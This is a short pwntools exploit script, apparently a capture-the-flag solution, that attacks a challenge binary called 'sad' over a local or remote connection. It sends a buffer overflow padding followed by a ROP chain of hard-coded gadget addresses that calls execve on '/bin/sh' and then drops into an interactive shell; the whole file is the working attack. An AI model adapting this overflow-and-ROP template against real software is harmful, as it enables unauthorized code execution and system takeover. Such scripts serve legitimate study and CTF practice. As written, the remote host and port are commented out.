from pwn import *

elf = ELF('./sad')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    # host = 'jh2i.com'
    # port = 50002
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
c
'''.format(**locals())

io = start()

#gadgets
binsh = 0x483008
pop_rdi = 0x0040187a
pop_rsi = 0x00407aae
pop_rdx = 0x0040177f
pop_rax = 0x0043f8d7
syscall = 0x00475052

io.recvuntil('you need ;)\n')
rop = flat([
	'A' * 0x100,
	'B' * 8,
	pop_rdi,
	binsh,
	pop_rsi,
	0x0,
	pop_rdx,
	0x0,
	pop_rax,
	0x3b,
	syscall #do execve. 
])
io.sendline(rop)
io.interactive()